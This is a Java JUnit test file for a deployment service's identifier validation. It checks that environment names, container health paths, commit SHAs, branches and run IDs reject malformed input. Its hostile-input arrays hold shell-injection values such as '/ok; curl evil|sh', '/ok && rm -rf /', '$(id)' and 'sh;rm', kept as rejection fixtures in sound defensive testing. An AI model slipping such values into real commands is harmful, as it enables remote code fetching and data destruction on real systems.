package eu.wohlben.qits.cd.control;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;

import eu.wohlben.qits.cd.error.BadRequestException;
import org.junit.jupiter.api.Test;

/**
 * The boundary validation of everything that reaches an argv or the container's health command —
 * plus the one intake field that reaches neither and is bounded anyway (the run id, whose length is
 * all that could hurt). Plain JUnit — nothing here needs a running application.
 */
class CdIdentifiersTest {

  @Test
  void namesAreDnsLabels() {
    assertEquals("some-epic", CdIdentifiers.requireName("some-epic", "environment name"));
    assertEquals("a", CdIdentifiers.requireName("a", "environment name"));
    for (String hostile :
        new String[] {
          null, "", "UPPER", "has space", "-leads", "trails-", "dot.dot", "a".repeat(64), "sh;rm"
        }) {
      assertThrows(
          BadRequestException.class,
          () -> CdIdentifiers.requireName(hostile, "environment name"),
          String.valueOf(hostile));
    }
  }

  @Test
  void healthPathsAreAbsoluteAndMetacharacterFree() {
    assertEquals("/q/health/ready", CdIdentifiers.requireHealthPath("/q/health/ready"));
    assertEquals("/healthz", CdIdentifiers.requireHealthPath("/healthz"));
    for (String hostile :
        new String[] {
          null, "", "healthz", "/ok; curl evil|sh", "/ok && rm -rf /", "/ok$(id)", "/ok`id`",
          "/ok health", "/ok\"", "/ok'"
        }) {
      assertThrows(
          BadRequestException.class,
          () -> CdIdentifiers.requireHealthPath(hostile),
          String.valueOf(hostile));
    }
  }

  @Test
  void shasAreHexObjectIds() {
    assertEquals("a".repeat(40), CdIdentifiers.requireSha("a".repeat(40)));
    assertEquals("1234abc", CdIdentifiers.requireSha("1234abc"));
    for (String hostile : new String[] {null, "", "latest", "HEAD", "a".repeat(65), "12345g7"}) {
      assertThrows(BadRequestException.class, () -> CdIdentifiers.requireSha(hostile));
    }
  }

  @Test
  void branchesArederivedFromNamesSafely() {
    assertEquals("epic/some-epic", CdIdentifiers.requireBranch("epic/some-epic"));
    for (String hostile : new String[] {null, "", "-x", "a..b", "a//b", "ends/", "x.lock"}) {
      assertThrows(BadRequestException.class, () -> CdIdentifiers.requireBranch(hostile));
    }
  }

  @Test
  void runIdsAreOptionalAndBounded() {
    // Absent is a first-class answer: it is what every row before V2 looks like, and what a sender
    // that names no run records.
    assertEquals(null, CdIdentifiers.requireRunId(null));
    // What qits-ci actually sends, and the shape of a hand-replayed one.
    assertEquals(
        "6f31a0c4-1c2b-4f7a-9b03-2ee45c1f8d61",
        CdIdentifiers.requireRunId("6f31a0c4-1c2b-4f7a-9b03-2ee45c1f8d61"));
    assertEquals("run-1", CdIdentifiers.requireRunId("run-1"));
    // The boundary is the point of the check — the column is varchar(255) and an oversized value
    // would fail the insert of a fire-and-forget delivery instead of answering the sender.
    assertEquals("a".repeat(64), CdIdentifiers.requireRunId("a".repeat(64)));
    for (String hostile : new String[] {"", "a".repeat(65), "-leads", "has space", "id;rm", "a/b"}) {
      assertThrows(BadRequestException.class, () -> CdIdentifiers.requireRunId(hostile), hostile);
    }
  }

  @Test
  void theImageReferenceConventionIsTheOneSpelled() {
    // Pins the exact shape a publisher has to tag: <registry>/<repository>/<application>:<sha>.
    assertEquals(
        "qits-artifacts:8080/qits/qits-gateway:" + "a".repeat(40),
        ImageRefs.imageRef("qits-artifacts:8080", "qits", "qits-gateway", "a".repeat(40)));
  }

  @Test
  void containerNamesCarryEnvironmentApplicationAndDeployment() {
    assertEquals(
        "qits-cd-some-epic-qits-gateway-0123abcd",
        DeployService.containerName("some-epic", "qits-gateway", "0123abcd-ffff-4000-8000-0000"));
  }
}
